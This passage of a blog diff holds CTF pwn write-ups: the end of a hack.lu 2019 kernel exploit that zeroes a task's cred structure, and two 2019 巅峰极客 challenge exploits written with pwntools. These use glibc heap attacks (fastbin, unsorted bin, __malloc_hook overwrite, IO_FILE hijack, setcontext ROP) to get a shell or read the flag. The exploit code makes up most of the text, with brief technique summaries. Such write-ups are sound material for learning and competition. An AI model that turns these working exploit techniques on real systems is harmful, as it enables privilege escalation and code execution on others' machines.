+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># HOST,PORT = &quot;babykernel2.forfuture.fluxfingers.net&quot;,&quot;1337&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(HOST,PORT,timeout=10)</span></span><br><span class="line">HOST,PORT = <span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8888</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">addr</span>):</span><br><span class="line">    sl(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">    r(<span class="string">&quot;level is: &quot;</span>)</span><br><span class="line">    value = <span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">addr,value</span>):</span><br><span class="line">    sl(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(addr))</span><br><span class="line">    sl(<span class="string">&quot;&gt; \r\r\n&quot;</span>,<span class="built_in">hex</span>(value))</span><br><span class="line"></span><br><span class="line">init_task = <span class="number">0xffffffff8181b4c0</span></span><br><span class="line">offset = <span class="number">0x218</span></span><br><span class="line"><span class="comment"># init_task.tasks.prev</span></span><br><span class="line">task = read(init_task+offset)-<span class="number">0x210</span></span><br><span class="line"><span class="comment"># task.cred</span></span><br><span class="line">cred = read(task+<span class="number">0x400</span>)</span><br><span class="line">write(cred,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x8</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x10</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x18</span>,<span class="number">0</span>)</span><br><span class="line">write(cred+<span class="number">0x20</span>,<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"><span class="comment"># read flag</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag&#123;nicely_done_this_is_how_a_privesc_can_also_go&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/11/09/2019hacklu/" data-id="cuidwkx8-nuOCF44hRSOvYhy_" data-title="hack.lu 2019" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2019巅峰极客线上赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/10/25/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BA%BF%E4%B8%8A%E8%B5%9B/" class="article-date">
+  <time class="dt-published" datetime="2019-10-25T03:07:10.000Z" itemprop="datePublished">2019-10-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/10/25/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BA%BF%E4%B8%8A%E8%B5%9B/">2019 巅峰极客 线上赛</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="snote"><a href="#snote" class="headerlink" title="snote"></a>snote</h2><p>泄露通过修改Topchunk的size，得到unsortedbin，进而得到libc</p>
+<p>之后用UAF Fastbin attack，修改<code>__malloc_hook</code>为one_gadget即可Getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#@Date: 2019-10-19 11:02:57</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;120&#x27;</span>]</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">HOST,PORT = <span class="string">&quot;55fca716.gamectf.com&quot;</span>,<span class="number">37009</span></span><br><span class="line">p = remote(HOST,PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop = <span class="literal">True</span>,timeout=<span class="number">1</span>)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,cnt</span>):</span><br><span class="line">    sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    sa(<span class="string">&quot;Size &gt; &quot;</span>,<span class="built_in">str</span>(size).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    sa(<span class="string">&quot;Content &gt; \n&quot;</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>():</span><br><span class="line">    sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,cnt</span>):</span><br><span class="line">    sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    sa(<span class="string">&quot;Size &gt; &quot;</span>,<span class="built_in">str</span>(size).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">    sa(<span class="string">&quot;Content &gt; \n&quot;</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>():</span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        finish</span></span><br><span class="line"><span class="string">        ni 9</span></span><br><span class="line"><span class="string">        b *$pc</span></span><br><span class="line"><span class="string">        b *__libc_malloc</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;name?\n&quot;</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x1f</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf08</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xd1</span>))</span><br><span class="line">add(<span class="number">0x108</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>))-<span class="number">0x3c4c0a</span></span><br><span class="line">log.info(<span class="string">&quot;libc.address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">__malloc_hook = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;__malloc_hook:&quot;</span>+<span class="built_in">hex</span>(__malloc_hook))</span><br><span class="line">one = libc.address+<span class="number">0xf02a4</span></span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(one))</span><br><span class="line"></span><br><span class="line">de()</span><br><span class="line">edit(<span class="number">0x8</span>,p64(__malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>+p64(one))</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&quot;choice &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">sa(<span class="string">&quot;Size &gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><ul>
+<li><p>通过多个unsorted bin泄露libc和heap</p>
+</li>
+<li><p>构造unsortedBin attack 修改<code>global_max_fast</code></p>
+</li>
+<li><p>Fastbin attack到Stream的IO_FILE结构中，劫持<code>_IO_file_jumps</code></p>
+</li>
+<li><p>通过<code>setcontext</code>的gadgets做ROP实现ORW，即可打印flag</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#@Date: 2019-10-19 11:20:07</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;a139cb3d.gamectf.com&quot;</span>,<span class="string">&quot;15189&quot;</span></span><br><span class="line">p = remote(HOST,PORT,timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop = <span class="literal">True</span>,timeout=<span class="number">1</span>)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,cnt</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;context:\n&quot;</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    sla(<span class="string">&quot;index:\n&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Done!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaking libc and heap</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xe8</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0xe8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">&#x27;3&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x88</span>,<span class="string">&#x27;4&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x88</span>,<span class="string">&#x27;flag\n&#x27;</span>)</span><br><span class="line">de(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;note[0]: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="string">&quot;libc.address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">_IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;_IO_list_all:&quot;</span>+<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line"><span class="built_in">open</span> = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;open:&quot;</span>+<span class="built_in">hex</span>(<span class="built_in">open</span>))</span><br><span class="line">read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;read:&quot;</span>+<span class="built_in">hex</span>(read))</span><br><span class="line">write= libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;write:&quot;</span>+<span class="built_in">hex</span>(write))</span><br><span class="line"></span><br><span class="line">de(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x88</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x4d0</span></span><br><span class="line">log.info(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin attack</span></span><br><span class="line"></span><br><span class="line">de(<span class="number">3</span>)</span><br><span class="line">de(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x88</span>,<span class="number">2</span>*p64(<span class="number">0</span>)+p64(heap+<span class="number">0x248</span>)+p64(heap+<span class="number">0x250</span>)+p64(heap+<span class="number">0x240</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x118</span>,<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x80</span>+p64(<span class="number">0x290</span>)+p64(<span class="number">0x90</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">de(<span class="number">4</span>)</span><br><span class="line">de(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x78</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x3c67e8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x318</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x88</span>,<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">de(<span class="number">2</span>)</span><br><span class="line">de(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">prdi_ret = libc.address+<span class="number">0x21102</span></span><br><span class="line">prsi_ret = libc.address+<span class="number">0x202e8</span></span><br><span class="line">pprdx_ret = libc.address+<span class="number">0x101ffc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop</span></span><br><span class="line"></span><br><span class="line">payload = <span class="number">7</span>*p64(<span class="number">0</span>)+p64(prdi_ret) <span class="comment">#pop rdi;ret</span></span><br><span class="line">payload += p64(heap+<span class="number">0x570</span>)+p64(prsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="built_in">open</span>)+p64(prdi_ret)+p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(prsi_ret)+p64(heap+<span class="number">0x1000</span>)+p64(pprdx_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(read)+p64(prdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(prsi_ret)+p64(heap+<span class="number">0x1000</span>)+p64(pprdx_ret)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write)</span><br><span class="line">payload += <span class="string">&#x27;\0&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload += p64(<span class="number">0xf1</span>)+p64(heap+<span class="number">0x9f</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x318</span>,payload+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake += <span class="number">0x1b</span>*p64(libc.address+<span class="number">0x47b75</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xe8</span>,fake)</span><br><span class="line"></span><br><span class="line">payload1= <span class="string">&quot;\x00&quot;</span>+p64(heap+<span class="number">0x100</span>)+p64(libc.address+<span class="number">0xc96a6</span>)+<span class="number">5</span>*p64(<span class="number">0</span>)+p64(heap+<span class="number">0x360</span>)</span><br><span class="line">payload1+= <span class="number">9</span>*p64(<span class="number">0</span>)+p64(libc.address+<span class="number">0x353aa</span>)<span class="comment">#add rsp,0x38;ret</span></span><br><span class="line">add(<span class="number">13</span>,<span class="number">0xe8</span>,payload1+<span class="string">&#x27;\n&#x27;</span>) <span class="comment">#add rsp,0x38;ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack file struct</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/10/25/2019%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BA%BF%E4%B8%8A%E8%B5%9B/" data-id="cuidmt50UpiK8a6RhaB6NY8hB" data-title="2019 巅峰极客 线上赛" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-2019flareonctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2019/10/10/2019flareonctf/" class="article-date">
@@ -724,23 +1392,23 @@
       <ul>
         
           <li>
+            <a href="/2025/11/19/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/19/cakectf2022/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/19/2025crewctf/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/11/19/2025%E7%9C%8B%E9%9B%AAkctf/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
-          </li>
-        
-          <li>
-            <a href="/2025/11/01/qwb2025-re/">qwb2025-re</a>
-          </li>
-        
-          <li>
-            <a href="/2025/10/25/qwb2025-pwn/">qwb2025-pwn flagmarket</a>
-          </li>
-        
-          <li>
-            <a href="/2025/10/10/junior/">n1ctf junior 2/2 web</a>
-          </li>
-        
-          <li>
-            <a href="/2025/09/16/n1ctf-pwn/">n1ctf2025_pwn</a>
           </li>
         
       </ul>
